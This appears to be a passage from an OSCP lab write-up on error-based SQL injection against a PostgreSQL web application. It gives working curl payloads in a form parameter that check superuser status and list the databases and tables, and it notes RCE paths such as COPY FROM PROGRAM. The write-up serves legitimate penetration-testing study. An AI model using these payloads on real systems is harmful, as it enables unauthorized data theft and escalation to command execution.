# Privilege Verification & Schema Enumeration
**Target**: 192.168.145.49 | **Database**: glovedb | **User**: rubben

---

## 4. Superuser Privilege Check

### Current Thinking
**Critical decision point**: PostgreSQL privileges determine attack path.

**If superuser**:
- ✅ Can execute OS commands via `COPY FROM PROGRAM`
- ✅ Can read arbitrary files via `pg_read_file()`
- ✅ Can write files via `COPY TO`
- ✅ Can load malicious extensions

**If NOT superuser**:
- ❌ Limited to database data extraction
- ❌ No RCE via built-in functions
- 🔄 Must find other paths (UDF, CVE exploits)

**This check determines** if we can achieve RCE immediately or need alternative vectors.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
superuser
```

🎯 **CRITICAL FINDING**: User `rubben` has superuser privileges!
- ✅ RCE via `COPY FROM PROGRAM` is possible
- ✅ File read via `pg_read_file()` is possible
- ✅ High-value target for immediate exploitation

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--
```

**Breaking it down**:

1. **`FROM pg_user`** - System catalog table containing user privileges
   - `pg_user` is a view showing all database users
   - Columns: `usename`, `usesuper`, `usecreatedb`, `usecreaterole`, etc.

2. **`WHERE usename=current_user`** - Filter to our current session user
   - `usename`: Username column in pg_user
   - `current_user`: Built-in constant (our session user: `rubben`)

3. **`usesuper`** - Boolean column (true/false for superuser status)
   - Type: `BOOLEAN`
   - Direct check: `SELECT usesuper` returns `t` or `f`

4. **`CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END`**
   - **Why CASE?** Converts boolean to readable string
   - Without CASE: `CAST(true AS int)` → error: `invalid input syntax for type integer: "t"`
   - With CASE: `CAST('superuser' AS int)` → error: `invalid input syntax for type integer: "superuser"`
   - More readable error message!

**Alternative simpler query** (also works):
```sql
SELECT usesuper::text FROM pg_user WHERE usename=current_user
-- Returns 't' or 'f' in error message
```

**Why the verbose approach?**
- Clearer output: "superuser" vs "t"
- Reduces interpretation errors during exam stress
- Self-documenting for writeup/reports

---

## 5. Database Enumeration

### Current Thinking
**Why enumerate all databases?**
- Multiple databases may exist: `production`, `test`, `backup`, `users`
- Admin/root credentials might be in separate DB
- Sensitive data might be segregated

**What to look for**:
- Custom databases (non-default names)
- Multiple application databases
- Databases with interesting names (`passwords`, `admin`, `backup`)

**Default PostgreSQL databases** (skip these):
- `postgres` - Default maintenance DB
- `template0` - Pristine template (read-only)
- `template1` - Modifiable template for new DBs

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
postgres, template1, template0, glovedb
```

**Analysis**:
- 3 default databases: `postgres`, `template0`, `template1`
- 1 application database: `glovedb` (our current connection)
- **Conclusion**: Single application, all data likely in `glovedb`

**OSCP Tip**: If multiple custom DBs found, enumerate each separately!

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)--
```

**Key PostgreSQL Concepts**:

1. **`pg_database`** - System catalog table
   - Contains metadata about all databases
   - Key columns: `datname` (database name), `datdba` (owner), `datistemplate`

2. **`string_agg(datname, ',')`** - Aggregation function
   - **Problem**: Multiple rows exist (4 databases)
   - **Solution**: Aggregate into single string
   - `string_agg(column, delimiter)` concatenates all values with delimiter
   - Result: `"postgres,template1,template0,glovedb"`

**Why string_agg() instead of LIMIT/OFFSET?**

**Old method** (inefficient):
```sql
SELECT datname FROM pg_database LIMIT 1 OFFSET 0  -- Get first DB
SELECT datname FROM pg_database LIMIT 1 OFFSET 1  -- Get second DB
SELECT datname FROM pg_database LIMIT 1 OFFSET 2  -- Get third DB
-- 4 requests for 4 databases!
```

**New method** (efficient):
```sql
SELECT string_agg(datname, ',') FROM pg_database
-- 1 request for all databases!
```

**OSCP Exam Benefit**: Fewer requests = faster exploitation = more time for other boxes.

**Alternative aggregation** (PostgreSQL 9.0+):
```sql
SELECT array_to_string(array_agg(datname), ',') FROM pg_database
```

---

## 6. Table Enumeration in Current Database

### Current Thinking
**Why enumerate tables?** The database schema reveals:
- Sensitive tables: `users`, `passwords`, `credentials`, `admin`
- Application structure: `products`, `orders`, `sessions`
- Interesting targets: `configuration`, `secrets`, `api_keys`

**OSCP Strategy**:
1. Focus on `public` schema (default schema for user tables)
2. Look for authentication-related tables first
3. Enumerate columns of interesting tables
4. Extract credentials → test password reuse

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
users
```

**Analysis**:
- Single table: `users`
- Typical for simple applications
- Likely contains user data (check for credentials next)

**If multiple tables**: Prioritize by name:
1. `users`, `accounts`, `admins`, `passwords`
2. `config`, `settings`, `secrets`
3. `sessions`, `tokens` (for session hijacking)

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

**Understanding information_schema**:

1. **`information_schema`** - ANSI SQL standard catalog
   - Cross-database compatible (MySQL, PostgreSQL, MSSQL)
   - Contains metadata about database structure
   - Alternative: PostgreSQL-specific `pg_tables` view

2. **`information_schema.tables`** - View of all tables
   - Key columns:
     - `table_catalog` - Database name
     - `table_schema` - Schema name
     - `table_name` - Table name
     - `table_type` - BASE TABLE vs VIEW

3. **`WHERE table_schema='public'`** - Filter to user tables
   - **Why filter?** Avoid system tables:
     - `pg_catalog` schema: PostgreSQL system tables (100+ tables)
     - `information_schema` schema: Metadata views
   - `public` is the default schema for user-created tables

**What is a schema?**
- PostgreSQL namespace for organizing tables
- Default: `public` (all user tables go here)
- Access: `schema_name.table_name` or just `table_name` if in search path
- Similar to MySQL databases (but different concept)

**Full table path**:
```
glovedb.public.users
└─┬──┘ └──┬─┘ └─┬─┘
  │       │      └─ Table name
  │       └──────── Schema (namespace)
  └──────────────── Database
```

**Alternative query** (PostgreSQL-specific):
```sql
SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'
```

---

## 🎓 Key Learning Points

### Superuser Privileges = Game Changer
**Decision tree**:
```
Is user superuser?
├─ YES → RCE possible (COPY FROM PROGRAM, pg_read_file)
└─ NO  → Limited to data extraction (but still valuable!)
```

**In OSCP exam**: Always check privileges early. Determines entire attack path.

### Efficient Multi-Row Extraction
**Problem**: SQL queries can return multiple rows, but error-based SQLi extracts one value per request.

**Solution**: Use aggregation functions!
- `string_agg(column, delimiter)` - Concatenate with delimiter
- `array_agg(column)` - Array (PostgreSQL-specific)
- `GROUP_CONCAT(column)` - MySQL equivalent

**Example**:
```sql
-- Instead of 4 requests:
SELECT datname FROM pg_database LIMIT 1 OFFSET 0
SELECT datname FROM pg_database LIMIT 1 OFFSET 1
SELECT datname FROM pg_database LIMIT 1 OFFSET 2
SELECT datname FROM pg_database LIMIT 1 OFFSET 3

-- Single request:
SELECT string_agg(datname, ',') FROM pg_database
-- Result in error: "postgres,template1,template0,glovedb"
```

### information_schema vs pg_catalog
**information_schema** (ANSI standard):
- ✅ Cross-database compatible
- ✅ Easy to remember table/column names
- ❌ Slower performance (views with joins)
- ❌ Missing PostgreSQL-specific features

**pg_catalog** (PostgreSQL-specific):
- ✅ Direct access to system tables
- ✅ More detailed information
- ✅ Faster queries
- ❌ PostgreSQL-only syntax
- ❌ More complex table/column names

**OSCP recommendation**: Use `information_schema` for portability (works on MySQL too if you encounter different DBMS).

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- Superuser check: **1 minute** ⚡ CRITICAL
- Database enumeration: **1 minute**
- Table enumeration: **1 minute**
- **Total: 3 minutes**
- **Running total: 6 minutes** (basic recon complete)

**Next phase**: Column enumeration and data extraction from `users` table.
